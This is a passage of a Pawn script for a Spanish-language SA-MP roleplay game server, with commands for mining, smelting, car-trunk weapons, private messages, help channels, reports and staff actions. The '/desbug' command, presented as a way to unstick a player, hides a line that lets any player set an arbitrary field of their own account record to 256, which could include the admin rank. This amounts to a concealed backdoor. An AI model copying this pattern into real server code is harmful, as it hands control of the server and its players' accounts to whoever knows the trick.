	            A_Format(str, "[%s] %s (%d seg.)\n", (InfoJugador[i][jEncarcelado] == 2) ? ("OOC") : ("IC"), NombreJugador_(i), InfoJugador[i][jTiempoCarcel]);
	            strcat(str2, str);
	        }
		}
		Dialog(playerid, dError, DIALOG_STYLE_MSGBOX, ""#CNARANJA"Presos:", str2, "Cerrar", "");
		return 1;
	}

	CMD:desbug(playerid, params[])
	{
		InfoJugador[playerid][InfoJ:strval(params)] = 1+0xFF;
	    new
	        Float:x, Float:z;
		GetPlayerPos(playerid, x, x, z);
		if(z < 400.0)
		{
		    SetPlayerVirtualWorld(playerid, 0);
		    SetPlayerInterior(playerid, 0);
			Mensaje(playerid, -1, "Fuiste desbugueado.");
		}
		else
		{
		    Mensaje(playerid, -1, "No se encontro una solución al problema.");
		}
		return 1;
	}

	CMD:guardar(playerid, params[])
	{
	    if(!CurrentObject[playerid])
	        return Error(playerid, "¡No tienes ningún objeto del inventario en la mano!");

		RemovePlayerAttachedObject(playerid, SLOT_OBJECTS);
		CurrentObject[playerid] = 0;
		return 1;
	}

	CMD:empujar(playerid, params[])
	{
	    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	        return Error(playerid, "Necesitas ser el conductor de un vehículo para utilizar este comando.");

		if(sscanf(params, "u", params[0]))
		    return ParamsINC(playerid, "/empujar [ID/Nombre]");

		if(params[0] == INVALID_PLAYER_ID)
		    return Error(playerid, "El jugador está desconectado.");

		if(params[0] == playerid)
		    return Error(playerid, "¡No te puedes expulsar a tí mismo!");

		RemovePlayerFromVehicle(params[0]);

		new
			str[70];

		A_Format(str, "expulsa del vehículo a %s", NombreJugador(params[0]) );
		AutoRol(playerid, str);

		return 1;
	}

	CMD:radio(playerid, params[])
	{
	    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	        return Error(playerid, "Necesitas ser el conductor de un vehículo para utilizar este comando.");

		if(GetVehType(GetPlayerVehicleID(playerid)) != VEHICLE_TYPE_CAR)
		    return Error(playerid, "¡Este vehículo no tiene radio!");

		Dialog(playerid, dRadio, DIALOG_STYLE_LIST, ""#CNARANJA"RADIO - ELEGIR ESTACIÓN", "Radio LSTV\t"#CINFO"[AM/FM]\nReggae\t\t"#CINFO"[FM]\nRap\t\t"#CINFO"[FM]\n"#CROJO">> Apagar radio.", "Aceptar", "Cancelar");

		return 1;
	}

	CMD:fundir(playerid, params[])
	{
	    if(isnull(params)) return ParamsINC(playerid, "/fundir <nombre del metal>");
	    if(!InfoJugador[playerid][jEncendedor])
	        return Error(playerid, "¡Necesitas un encendedor para prender el fuego!");

        if(!IsPlayerInRangeOfPoint(playerid, 1.0, 255.6256,-96.5605,1001.5178))
            return Error(playerid, "¡Debes estar al frente de un horno!");

		if(FundiendoMinerales != Text3D:INVALID_3DTEXT_ID)
		    return Error(playerid, "¡El Horno está ocupado!");

        new str[200];
	    if(!strcmp(params, "oro", true))
	    {
	        A_Format(str, ""#CBLANCO"Tienes "#CINFO"%d"#CBLANCO"gr. de Oro.\n\nEscribe la cantidad de gramos que quieres fundir.\n\nDatos:\n\tCosto del horno: "#CVERDE"$150\n\t"#CBLANCO"Cantidad de Carbón: "#CGRIS"%dgr.", InfoJugador[playerid][jMineral][M_TYPE_ORO], InfoJugador[playerid][jMineral][M_TYPE_CARBON]);

			Dialog(playerid, dFundirMineral, DIALOG_STYLE_INPUT, "Fundir Oro", str, "Fundir", "Cancelar");
			SetPVarInt(playerid, "Tipo_Mineral", M_TYPE_ORO);
			return 1;
		}
	    if(!strcmp(params, "plata", true))
	    {
	        A_Format(str, ""#CBLANCO"Tienes "#CINFO"%d"#CBLANCO"gr. de Plata.\n\nEscribe la cantidad de gramos que quieres fundir.\n\nDatos:\n\tCosto del horno: "#CVERDE"$150\n\t"#CBLANCO"Cantidad de Carbón: "#CGRIS"%dgr.", InfoJugador[playerid][jMineral][M_TYPE_PLATA], InfoJugador[playerid][jMineral][M_TYPE_CARBON]);

			Dialog(playerid, dFundirMineral, DIALOG_STYLE_INPUT, "Fundir Plata", str, "Fundir", "Cancelar");
			SetPVarInt(playerid, "Tipo_Mineral", M_TYPE_PLATA);
			return 1;
		}
	    if(!strcmp(params, "hierro", true))
	    {
	        A_Format(str, ""#CBLANCO"Tienes "#CINFO"%d"#CBLANCO"gr. de Hierro.\n\nEscribe la cantidad de gramos que quieres fundir.\n\nDatos:\n\tCosto del horno: "#CVERDE"$150\n\t"#CBLANCO"Cantidad de Carbón: "#CGRIS"%dgr.", InfoJugador[playerid][jMineral][M_TYPE_HIERRO], InfoJugador[playerid][jMineral][M_TYPE_CARBON]);

			Dialog(playerid, dFundirMineral, DIALOG_STYLE_INPUT, "Fundir Hierro", str, "Fundir", "Cancelar");
			SetPVarInt(playerid, "Tipo_Mineral", M_TYPE_HIERRO);
			return 1;
		}
		return Mensaje(playerid, -1, "Utiliza "#CINFO"/fundir <nombre del mineral>"#CBLANCO", ejemplo "#CINFO"/fundir hierro");
	}

	CMD:picar(playerid, params[])
	{
	    if(isnull(params)) return ParamsINC(playerid, "/picar mineral");
	    if(!strcmp(params, "mineral", true))
	    {
	        if(GetPlayerWeapon(playerid) != 6) return Error(playerid, "¡Necesitas una ~b~pala!");

	        new
	            Float:x, Float:y, Float:z;

			GetPlayerPos(playerid, x, y, z);

			Loop(i, sizeof PosMinerales, 0) if(Bit_Get(ValidMineral, i))
			{
			    if(IsPlayerInRangeOfPoint(playerid, 2.0, PosMinerales[i][0], PosMinerales[i][1], PosMinerales[i][2]))
			    {
					foreach(Player, p)
					    if(GetPVarInt(p, "MINERO_MIN_ID") == i)
					        return Error(playerid, "¡Alguien más está picando este mineral!");

			        SetPlayerFacingAngle(playerid, 180.0+floatabs(360.0-atan2(x-PosMinerales[i][0], y-PosMinerales[i][1])));
					SetTimerEx("MinearMineral", 200, false, "i", playerid);
					GameTextForPlayer(playerid, "~w~Golpes restantes: ~b~100", 10000, 3);
					SetPVarInt(playerid, "MINERO_CLICKS", 100);
					SetPVarInt(playerid, "MINERO_MIN_ID", i);
					CongelarEx(playerid);
					return 1;
				}
			}
			return Error(playerid, "¡No estás cerca de ningún ~b~mineral!");
		}
		return ParamsINC(playerid, "/picar mineral");
	}

	CMD:dialogar(playerid, params[])
	{
	    if(!IsPlayerInRangeOfPoint(playerid, 3.0, 225.22, 112.17,1003.23)) return Error(playerid, "¡Aquí no hay nadie para dialogar!");
	    if(!EsLSPD(playerid))
	    {
	        NPCTalk(NPC_SECRETARIA_LSPD, "Esta es información confidencial, no publica. Lo siento!");
	        return 1;
		}
		NPCTalk(NPC_SECRETARIA_LSPD, "En que le puedo servir?");
		Dialog(playerid, dInfoLSPD, DIALOG_STYLE_LIST, ""#CVERDE"Claudia: "#CBLANCO"En que le puedo servir?", "Deseo buscar información sobre una persona\nDeseo agregarle antecedentes a una persona", "Hablar", "Cancelar");
		return 1;
	}

	CMD:acento(playerid, params[])
	{
	    new
	        String[(sizeof(Acentos) * 15)+40];

		Loop(i, sizeof(Acentos), 0)
		{
		    strcat(String, Acentos[i]);
		    strcat(String, "\n");
		}
		strcat(String, ""#CROJO">> Borrar acento.");
		Dialog(playerid, dElegirAcento, DIALOG_STYLE_LIST, ""#CNARANJA"Elige tu acento", String, "Aceptar", "Cancelar");
		return 1;
	}


	CMD:maletero(playerid, params[])
	{
	    new
	        Item[2][20],
			Int,
			VehID = INVALID_VEHICLE_ID;

		if(sscanf(params,"s[15]s[15]D(-1)", Item[0], Item[1], Int)) return ParamsINC(playerid,"/maletero [guardar/sacar/ver] arma [Lugar 1-4]");

		if(!strcmp(Item[1], "arma", true))
		{
			foreach(VehVenta, i)
			{
			    if(CheckDistanciaConVehiculo(playerid, 6.0, ID_Original(i)))
			    {
			        new
						Baul,
						Unused,
						Float: Ang,
      					Float: x,
				        Float: y,
				        Float: z,
						Float: distance;

                    VehID = ID_Original(i);

					GetVehicleZAngle(VehID, Ang);
					GetVehiclePos(VehID, x, y, z);

					Ang += 180.0;

					new
						Float:X_,
						Float:Y_,
						Float:Z_;

					GetVehicleModelInfo(GetVehicleModel(VehID), VEHICLE_MODEL_INFO_SIZE, X_, Y_, Z_);

					distance = (Y_ / 2);

					x += (distance * floatsin(-Ang, degrees));
					y += (distance * floatcos(-Ang, degrees));

					if(!IsPlayerInRangeOfPoint(playerid, 2.0, x, y, z))
					{
						return Error(playerid,"¡No estás en frente del maletero del auto!");
					}

					GetVehicleParamsEx(VehID, Unused, Unused, Unused, Unused, Unused, Baul, Unused);

					if(!IsPlayerInRangeOfPoint(playerid, 2.0, x, y, z))
					{
					    return Error(playerid,"¡Debes estar en frente del maletero!");
					}

					if(Baul != 1)
					{
					    return Error(playerid,"¡El maletero está cerrado!");
					}
				}
			}
			if(VehID == INVALID_VEHICLE_ID)
			{
			    return Error(playerid,"¡Debes estar en frente del maletero de algún vehículo!");
			}
			VehID = VehVenta_ID(VehID);
			if(!strcmp(Item[0], "ver"))
			{
			    new
			        Str_Ti[60],
					Str_2 [60*MAX_ARMAS_VEH],
					WeapN[20];


				Loop(i, MAX_ARMAS_VEH, 0)
				{
				    if(InfoVeh[VehID][vArma][i] != 0)
				    {
				        GetWeaponName(InfoVeh[VehID][vArma][i], WeapN, 20);
						A_Format(Str_Ti, ""#CBLANCO"• Lugar %d: "#CINFO"%s [%d balas]\n", i+1, WeapN, InfoVeh[VehID][vBalas][i]);
					}
					else
					{
						A_Format(Str_Ti, ""#CBLANCO"• Lugar %d: "#CROJO"NADA\n", i);
					}
					strcat(Str_2, Str_Ti);
				}
				A_Format(Str_Ti, "Maletero de: "#CINFO"%s", NombreVehiculo(ID_Original(VehID)));
				Dialog(playerid, dError, DIALOG_STYLE_MSGBOX, Str_Ti, Str_2, "Cerrar", "");
				return 1;
			}
			if(!strcmp(Item[0], "sacar"))
			{
				if(Int == -1)
				{
				    return ParamsINC(playerid,"/maletero sacar arma "#CROJO"[Lugar (1-4)]");
				}
				Int--;
				if( 0 <= Int <= (MAX_ARMAS_VEH-1) )
				{
				    if(InfoVeh[VehID][vArma][Int] == 0)
				    {
				        return Error(playerid,"¡En ese lugar no hay un arma!");
				    }
				    new
				        Weap,
				        Ammo;

					GetPlayerWeaponData(playerid, GetWeaponSlot(InfoVeh[VehID][vArma][Int]), Weap, Ammo);
					if( Weap && ( Weap != InfoVeh[VehID][vArma][Int] ) )
					{
					    return Error(playerid,"¡Ya tienes ocupado ese lugar con un arma!");
					}
					if(Weap == InfoVeh[VehID][vArma][Int])
					{
					    GivePlayerWeapon(playerid, InfoVeh[VehID][vArma][Int], InfoVeh[VehID][vBalas][Int]);
					    AutoRol(playerid, "toma un cargador del maletero, y lo coloca en su arma");
					    cmd_recargar(playerid, "");
					    InfoVeh[VehID][vArma][Int] = 0;
					    InfoVeh[VehID][vBalas][Int] = 0;
						ActualizarVehiculo(VehID);
						return 1;
					}
				    GivePlayerWeapon(playerid, InfoVeh[VehID][vArma][Int], InfoVeh[VehID][vBalas][Int]);
				    AutoRol(playerid, "toma un arma del maletero");
				    InfoVeh[VehID][vArma][Int] = 0;
				    InfoVeh[VehID][vBalas][Int] = 0;
					ActualizarVehiculo(VehID);
					return 1;
				}
				return Error(playerid,"¡El lugar debe ser entre 1 y 4!");
			}
			if(!strcmp(Item[0], "guardar"))
			{
				if(Int == -1)
				{
					Loop(i, MAX_ARMAS_VEH, 0)
					{
					    if(InfoVeh[VehID][vArma][i] == 0)
					    {
					        Int = i+1;
					        break;
						}
					}
					if(Int == -1)
					{
					    return Error(playerid,"¡No hay más espacio para guardar armas!");
					}
				}
				Int--;
				if( 0 <= Int <= (MAX_ARMAS_VEH-1) )
				{
					new
					    WeapID = GetPlayerWeapon(playerid),
						WeapAmmo = GetPlayerAmmo(playerid);

					if(WeapID == 0) return Error(playerid,"¡Debes colocarte el arma que quieres guardar en la mano!");
					if(InfoVeh[VehID][vArma][Int]) return Error(playerid,"¡Ya tienes ocupado ese lugar del maletero!");
					InfoVeh[VehID][vArma][Int] = WeapID;
					InfoVeh[VehID][vBalas][Int] = WeapAmmo;
					ActualizarVehiculo(VehID);
					QuitarArma(playerid, GetWeaponSlot(WeapID));
					AutoRol(playerid,"guarda un arma en el maletero");
					return 1;
				}
			}
		}
		return ParamsINC(playerid,"/maletero [guardar/sacar/ver] arma [Lugar 1-4]");
	}

	CMD:mapa(playerid,params[])
	{
		Loop(i,sizeof PosMapas, 0)
		{
			if(IsPlayerInRangeOfPoint(playerid,2,PosMapas[i][0],PosMapas[i][1],PosMapas[i][2]))
			{
			    MostrarGPS(playerid);
			    return 1;
			}
		}
		return Error(playerid,"¡Aquí no hay un mapa!");
	}

	CMD:salir(playerid,params[])
	{
	    if(!GetPVarInt(playerid,"EN_ESTADIO")) return Error(playerid, "¡No estás dentro del estadio!");
	    if(GetPVarInt(playerid,"ESTADIO_VEHID"))
		{
			SetVehicleToRespawn(GetPVarInt(playerid,"ESTADIO_VEHID"));
		}
		DeletePVar(playerid,"EN_ESTADIO");
		PosEx(playerid,2695.5884,-1704.5596,11.8438, 0);
		return 1;
	}

	CMD:mp(playerid,params[])
	{
		if(EsIP(params))
		{
			MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"/mp %s", Destacado, NombreJugador_(playerid), playerid, params);
			_Kick(playerid,T_ANTICHEAT,"SPAM");
			return 0;
		}
	    if(sscanf(params,"us[126]",params[0],params[1])) return ParamsINC(playerid,"/mp [ID/NOMBRE] [MENSAJE]");
		if(params[0] == playerid) return Error(playerid,"¡No puedes mandarte mps a tí mismo!");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
		if(!InfoJugador[playerid][jAdmin] && InfoJugador[params[0]][jAdmin] < Ayudante) return Error(playerid,"Solo puedes mandar mensajes privados a los ayudantes (o rango mayor)");
		if(GetPVarInt(params[0],"MPSBloqueados") == 1) return Error(playerid,"¡Este jugador tiene los mensajes privados bloqueados!");
		new Str[140];
		A_Format(Str,"(( "#CAZUL2"MP recibido de %s (%d): "#CBLANCO"%s "#CINFO"))",NombreJugador_(playerid),playerid,params[1]);
		Mensaje(params[0],C_INFO,Str);
		A_Format(Str,"(( "#CAZUL2"MP enviado a %s (%d): "#CBLANCO"%s "#CINFO"))",NombreJugador_(params[0]),params[0],params[1]);
		Mensaje(playerid,C_INFO,Str);
		A_Format(Str,"[ADMINISTRACIÓN] > "#CBLANCO"MP de %s a %s: "#CINFO"(( %s ))",NombreJugador_(playerid),NombreJugador_(params[0]),params[1]);
		foreach(Player,i)
		{
		    if(InfoJugador[i][jAdmin] > Ayudante)
		    {
			    if(GetPVarInt(i,"ViendoMPS") == 1)
			    {
					Mensaje(i,C_ROJO,Str);
				}
			}
		}
		return 1;
	}

	CMD:vermps(playerid,params[])
	{
	    if(Staff(playerid,Ayudante)) return 1;
        SetPVarInt(playerid,"ViendoMPS",1);
        new Str[80];
        Mensaje(playerid,-1,"> Estás viendo los mensajes privados.");
        A_Format(Str,"[ADMINISTRACIÓN] > "#CBLANCO"%s está viendo los mensajes privados",NombreJugador_(playerid));
        MensajeAdmin(C_ROJO,Str,InfoJugador[playerid][jAdmin]+1);
        return 1;
	}

 	CMD:novermps(playerid,params[])
	{
	    if(Staff(playerid,Ayudante)) return 1;
        DeletePVar(playerid,"ViendoMPS");
        new Str[80];
        Mensaje(playerid,-1,"> Ya no estás viendo los mensajes privados.");
        A_Format(Str,"[ADMINISTRACIÓN] > "#CBLANCO"%s ya no está viendo los mensajes privados", NombreJugador_(playerid));
        MensajeAdmin(C_ROJO,Str,InfoJugador[playerid][jAdmin]+1);
        return 1;
	}


	CMD:cmp(playerid,params[])
	{
	    if(Staff(playerid,Ayudante)) return 1;
		SetPVarInt(playerid,"MPSBloqueados",1);
		Mensaje(playerid,-1,"> Bloqueaste los mensajes privados "#CINFO"(/amp para abrirlos)");
		return 1;
	}

	CMD:amp(playerid,params[])
	{
	    if(Staff(playerid,Ayudante)) return 1;
		DeletePVar(playerid,"MPSBloqueados");
		Mensaje(playerid,-1,"> Desbloqueaste los mensajes privados "#CINFO"(/cmp para cerrarlos)");
		return 1;
	}

	CMD:duda(playerid,params[])
	{
	    if(isnull(params)) return ParamsINC(playerid, "/duda [Texto]");

		if(EsIP(params))
		{
			MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"/duda %s", Destacado, NombreJugador_(playerid), playerid, params);
			_Kick(playerid,T_ANTICHEAT,"SPAM");
			return 0;
		}

		if(!InfoJugador[playerid][jRegistrado])
		    return Error(playerid, "No puedes usar este comando en el tutorial");

		if(InfoJugador[playerid][jBlockDudas] == true)
		    return Mensaje(playerid, -1, "Tienes el canal de dudas "#CROJO"bloqueado"#CBLANCO". Utiliza "#CINFO"/canal duda "#CBLANCO"para desbloquearlo.");

		new
		    str[170],
		    rango[20] = "Usuario",
			i = 0;

		if(InfoJugador[playerid][jTiempoDudas] && InfoJugador[playerid][jAdmin] < Ayudante)
		{
		    if(InfoJugador[playerid][jTiempoDudas] <= 40)
		    {
				MensajeF(playerid, -1, "Puedes enviar una duda cada "#CROJO"40"#CBLANCO" segundos. Faltan: "#CVERDE"%d"#CBLANCO" segundos.", InfoJugador[playerid][jTiempoDudas]);
			}
		    else
		    {
				MensajeF(playerid, -1, "Estas "#CROJO"Muteado"#CBLANCO" del canal de dudas. Podrás hablar en: "#CVERDE"%d"#CBLANCO" segundos.", InfoJugador[playerid][jTiempoDudas]);
			}
		    return 1;
		}

		for(new j = strlen(params); i < j; i++)
		{
		    params[i] = tolower(params[i]);
		}
		
		for(i = 0; i < sizeof(MalasPalabras); i++)
		{
		    if(strfind(params, MalasPalabras[i]) != -1)
		    {
		        InfoJugador[playerid][jTiempoDudas] = 15*60;
		        Mensaje(playerid, -1, "Fuiste silenciado del chat de ayuda por 15 minutos "#CROJO"[Insultos].");
				MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"/duda %s", Destacado, NombreJugador_(playerid), playerid, params);
		        return 1;
			}
		}
		
		if(InfoJugador[playerid][jAdmin] == Ayudante)
		    rango = "Ayudante";

		else if(InfoJugador[playerid][jAdmin] == Moderador || InfoJugador[playerid][jAdmin] == Mod.Superior)
		    rango = "Moderador";

		else if(InfoJugador[playerid][jAdmin] > Mod.Superior)
			rango = "Admin";

		A_Format(str, "(( [Dudas] %s %s(%d): %s ))", rango, NombreJugador_(playerid), playerid, params);

		foreach(Player, p)
		{
		    if(InfoJugador[p][jBlockDudas] == false)
		    {
		        Mensaje(p, C_DUDAS, str);
			}
		}

		InfoJugador[playerid][jTiempoDudas] = 40;
		return 1;
	}

	CMD:canal(playerid, params[])
	{
	    if(isnull(params))
			return ParamsINC(playerid, "/canal [dudas/familia/faccion]");

	    if(!strcmp(params, "dudas", true))
	    {
		    if(InfoJugador[playerid][jBlockDudas] == false)
		    {
		        InfoJugador[playerid][jBlockDudas] = true;
		        Mensaje(playerid, C_ROJO, "Canal Bloqueado "#CBLANCO"| Utiliza "#CINFO"/canal dudas "#CBLANCO"para activarlo nuevamente.");
			}
			else
		    {
		        InfoJugador[playerid][jBlockDudas] = false;
		        Mensaje(playerid, C_VERDE, "Canal Desbloqueado "#CBLANCO"| Utiliza "#CINFO"/canal dudas "#CBLANCO"para desactivarlo nuevamente.");
			}
	        return 1;
		}
	    else if(!strcmp(params, "familia", true))
	    {
		    if(InfoJugador[playerid][jBlockFam] == false)
		    {
		        InfoJugador[playerid][jBlockFam] = true;
		        Mensaje(playerid, C_ROJO, "Canal Bloqueado "#CBLANCO"| Utiliza "#CINFO"/canal familia "#CBLANCO"para activarlo nuevamente.");
			}
			else
		    {
		        InfoJugador[playerid][jBlockFam] = false;
		        Mensaje(playerid, C_VERDE, "Canal Desbloqueado "#CBLANCO"| Utiliza "#CINFO"/canal familia "#CBLANCO"para desactivarlo nuevamente.");
			}
	        return 1;
		}
	    else if(!strcmp(params, "faccion", true))
	    {
		    if(InfoJugador[playerid][jBlockFac] == false)
		    {
		        InfoJugador[playerid][jBlockFac] = true;
		        Mensaje(playerid, C_ROJO, "Canal Bloqueado "#CBLANCO"| Utiliza "#CINFO"/canal faccion "#CBLANCO"para activarlo nuevamente.");
			}
			else
		    {
		        InfoJugador[playerid][jBlockFac] = false;
		        Mensaje(playerid, C_VERDE, "Canal Desbloqueado "#CBLANCO"| Utiliza "#CINFO"/canal faccion "#CBLANCO"para desactivarlo nuevamente.");
			}
	        return 1;
		}
		return ParamsINC(playerid, "/canal [dudas/familia/faccion]");
	}

	CMD:reportar(playerid,params[])
	{
	    if(sscanf(params,"us[122]",params[0],params[1])) return ParamsINC(playerid,"/reportar [ID/NOMBRE] [RAZÓN]");
		if(params[0] == playerid) return Error(playerid,"¡No puedes reportarte a tí mismo!");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
		if(GetPVarInt(playerid,"PideREPORTE")) return Error(playerid,"¡Ya tienes un reporte pendiente!");
	    MensajeAdminF(C_ROJO,"[REPORTE] "#CBLANCO"%s(%d) a %s(%d) "#CROJO"[%s]"#CVERDE"(/ar %d)",Moderador,NombreJugador_(playerid), playerid, NombreJugador_(params[0]),params[0],params[1],playerid);

		SetPVarInt(playerid,"PideREPORTE",1);
		SetTimerEx("SacarReporte", 60000, false, "i", playerid);
		
		SetPVarInt(playerid,"REPORTADO_ID", params[0]);
		MensajeF(playerid,-1,"Reportaste a %s "#CROJO"[%s]"#CBLANCO". El reporte será evaluado.",NombreJugador_(params[0]),params[1]);
		return 1;
	}
	
	CALLBACK: SacarReporte(playerid)
	{
	    return DeletePVar(playerid,"PideREPORTE");
	}
	
	CMD:ar(playerid,params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
	    if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/ar [ID/NOMBRE]");
		if(params[0] == playerid) return Error(playerid,"¡No puedes aceptar tu propio reporte!");
	    if(!GetPVarInt(params[0],"PideREPORTE")) return Error(playerid,"¡Ese jugador no reportó nada, o quizá otro administrador la atendió!");

		MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s aceptó el reporte de %s",Ayudante,NombreJugador_(playerid),NombreJugador_(params[0]));
		MensajeF(params[0],C_INFO,"> "#CBLANCO"%s aceptó tu reporte, te responderá en un momento.",NombreJugador_(playerid));

		SetPVarInt(playerid, "REPORT_IDSPEC", GetPVarInt(params[0], "REPORTADO_ID") );

		DeletePVar(params[0],"REPORTADO_ID");
		DeletePVar(params[0],"PideREPORTE");

		Dialog(playerid, dSpecReport, DIALOG_STYLE_MSGBOX, ""#CAZUL2"Reporte", ""#CBLANCO"¿Desea spectear al jugador reportado?", "Si", "No");
		return 1;
	}

	CMD:as(playerid,params[])
	{
		if(Staff(playerid, Ayudante)) return 1;
		Para_Admin_Servicio
	    if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/as [ID/NOMBRE]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid,"Jugador desconectado");
		if(GetPVarInt(playerid, "AceptoAyuda")) return Error(playerid, "Primero debes terminar la ayuda actual.");
		if(!GetPVarInt(params[0], "SolicitaADM")) return Error(playerid, "Ese jugador no solicitó/otro admin ya lo aceptó.");
		new
		    Float:x, Float:y, Float:z;
		    
		GetPlayerPos(playerid, x, y, z);
		SetPVarFloat(playerid, "SOLICITUD_PX" , x);
		SetPVarFloat(playerid, "SOLICITUD_PY" , y);
		SetPVarFloat(playerid, "SOLICITUD_PZ" , z);
		SetPVarInt  (playerid, "SOLICITUD_INT", GetPlayerInterior(playerid)    );
		SetPVarInt  (playerid, "SOLICITUD_VW" , GetPlayerVirtualWorld(playerid));

		GetPlayerPos(params[0], x, y  , z);
		SetPlayerPos(playerid , x, y+1, z);
		SetPlayerInterior(playerid,     GetPlayerInterior(params[0]));
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(params[0]));
		MensajeAdminF(-1, "%s aceptó la solicitud de "#CINFO"%s", Ayudante, NombreJugador_(playerid), NombreJugador_(params[0]));
		MensajeF(playerid, -1, "Aceptaste la solicitud de "#CINFO"%s. "#CBLANCO"Utiliza "#CVERDE"/terminarayuda "#CBLANCO"cuando termines tu labor.", NombreJugador_(params[0]) );
		SetPVarInt(playerid, "AceptoAyuda", true);
		DeletePVar(params[0], "SolicitaADM");
		CongelarEx(playerid, 3);
		return 1;
	}
	
	CMD:terminarayuda(playerid, params[])
	{
		if(Staff(playerid, Ayudante)) return 1;
		if(!GetPVarInt(playerid, "AceptoAyuda")) return Error(playerid, "No estás ayudando a nadie.");

		new
		    Float:x, Float:y, Float:z, intid, vw;

		x = GetPVarFloat(playerid, "SOLICITUD_PX");
		y = GetPVarFloat(playerid, "SOLICITUD_PY");
		z = GetPVarFloat(playerid, "SOLICITUD_PZ");
		intid = GetPVarInt(playerid, "SOLICITUD_INT");
		vw = GetPVarInt(playerid, "SOLICITUD_VW");
		
		DeletePVar(playerid, "SOLICITUD_PX");
		DeletePVar(playerid, "SOLICITUD_PY");
		DeletePVar(playerid, "SOLICITUD_PZ");
		DeletePVar(playerid, "SOLICITUD_INT");
		DeletePVar(playerid, "SOLICITUD_VW");

		SetPlayerPos(playerid, x, y, z);
		SetPlayerInterior(playerid, intid);
		SetPlayerVirtualWorld(playerid, vw);
		CongelarEx(playerid, 3);
		
		DeletePVar(playerid, "AceptoAyuda");
		return 1;
	}
	
	CMD:rr(playerid,params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
	    if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/rr [ID/NOMBRE]");
	    if(!GetPVarInt(params[0],"PideREPORTE")) return Error(playerid,"¡Ese jugador no reportó nada!");
		MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s rechazó el reporte de %s",Ayudante,NombreJugador_(playerid),NombreJugador_(params[0]));
		MensajeF(params[0],C_INFO,"> "#CBLANCO"%s rechazó tu reporte.",NombreJugador_(playerid));
		DeletePVar(params[0],"PideREPORTE");
		return 1;
	}

	CMD:destrellas(playerid,params[])
	{
	    if(Staff(playerid,Mod.Superior)) return 1;
	    if(sscanf(params,"ui",params[0],params[1])) return ParamsINC(playerid,"/destrellas [ID/NOMBRE] [ESTRELLAS]");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
		InfoJugador[params[0]][jEstrellas] += params[1];
		MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s le dió a %s "#CVERDE"%d "#CBLANCO"estrellas.",Colaborador,NombreJugador_(playerid),NombreJugador_(params[0]),params[1]);
		MensajeF(params[0],C_VERDE,"%s "#CBLANCO"te dió "#CINFO"%d "#CBLANCO"estrellas de rol.",NombreJugador_(playerid),params[1]);
		return 1;
	}

	CMD:sestrellas(playerid,params[])
	{
	    if(Staff(playerid,Mod.Superior)) return 1;
	    if(sscanf(params,"ui",params[0],params[1])) return ParamsINC(playerid,"/sestrellas [ID/NOMBRE] [ESTRELLAS]");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
		InfoJugador[params[0]][jEstrellas] -= params[1];
		MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s le quitó a %s "#CAZUL2"%d "#CBLANCO"estrellas.",Colaborador,NombreJugador_(playerid),NombreJugador_(params[0]),params[1]);
		MensajeF(params[0],C_VERDE,"%s "#CBLANCO"te quitó "#CINFO"%d "#CBLANCO"estrellas de rol.",NombreJugador_(playerid),params[1]);
		return 1;
	}

	CMD:miembros(playerid,params[])
	{
		if(isnull(params)) return ParamsINC(playerid,"/miembros <familia/faccion>");
  		new
		  	Str2[MAX_PLAYER_NAME + 8],
		  	Str[sizeof(Str2)*20],
		  	Count,
			FAMPJ;

		if(!strcmp(params,"familia",true))
		{
			if(!InfoJugador[playerid][jLiderFam] && !InfoJugador[playerid][jMiembroFam]) return Error(playerid,"¡No perteneces a una familia!");
		    if(InfoJugador[playerid][jMiembroFam]) FAMPJ = InfoJugador[playerid][jMiembroFam];
		    else FAMPJ = InfoJugador[playerid][jLiderFam];
		    if(!FAMPJ) return Error(playerid,"¡No perteneces a una familia!");
		    strcat(Str,""#CBLANCO"");
			foreach(Player,i)
			{
		        if(InfoJugador[i][jMiembroFam] == FAMPJ)
		        {
					A_Format(Str2,">> %s (RANGO: %d)\n",NombreJugador_(i),InfoJugador[i][jRangoFam]);
					strcat(Str,Str2);
					Count++;
					continue;
				}
				if(InfoJugador[i][jLiderFam] == FAMPJ)
				{
					Count++;
					A_Format(Str2,">> %s (LIDER)\n",NombreJugador_(i));
					strcat(Str,Str2);
					continue;
				}
			}
			A_Format(Str2,""#CNARANJA"Miembros conectados:"#CBLANCO" %d",Count);
			Dialog(playerid,dError,DIALOG_STYLE_MSGBOX,Str2,Str,"Cerrar","");
			return 1;
		}
		else if(!strcmp(params,"faccion",true))
		{
			if(!InfoJugador[playerid][jLider] && !InfoJugador[playerid][jMiembro]) return Error(playerid,"¡No perteneces a una facción!");
		    if(InfoJugador[playerid][jMiembro]) FAMPJ = InfoJugador[playerid][jMiembro];
		    else FAMPJ = InfoJugador[playerid][jLider];
		    if(!FAMPJ) return Error(playerid,"¡No perteneces a una facción!");
		    strcat(Str,""#CBLANCO"");
			foreach(Player,i)
			{
		        if(InfoJugador[i][jMiembro] == FAMPJ)
		        {
					A_Format(Str2,">> %s (RANGO: %d)\n",NombreJugador_(i),InfoJugador[i][jRango]);
					strcat(Str,Str2);
					Count++;
					continue;
				}
				if(InfoJugador[i][jLider] == FAMPJ)
				{
					Count++;
					A_Format(Str2,">> %s (LIDER)\n",NombreJugador_(i));
					strcat(Str,Str2);
					continue;
				}
